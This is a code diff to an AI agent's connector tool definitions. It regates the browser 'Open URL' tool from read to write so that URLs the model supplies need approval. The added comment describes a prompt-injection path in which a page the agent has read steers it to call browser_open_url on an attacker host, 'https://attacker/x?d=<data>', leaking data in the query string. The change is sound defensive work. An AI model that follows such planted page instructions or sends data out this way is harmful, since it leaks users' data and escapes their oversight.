@@ -36,7 +36,11 @@ TOOL_DEFS: tuple[ConnectorToolDef, ...] = (
         "browser",
         "browser_open_url",
         "Open URL",
-        "read",
+        # Navigation is a read for the remote host but an outbound channel here: a page the
+        # agent already read can steer it to `browser_open_url("https://attacker/x?d=<data>")`
+        # and the data leaves in the query string with no prompt. Gate it like a write so the
+        # model-supplied URL is approved before the browser navigates (see #399).
+        "write",
         "Open a URL in the Playwright browser.",
     ),
     ConnectorToolDef(
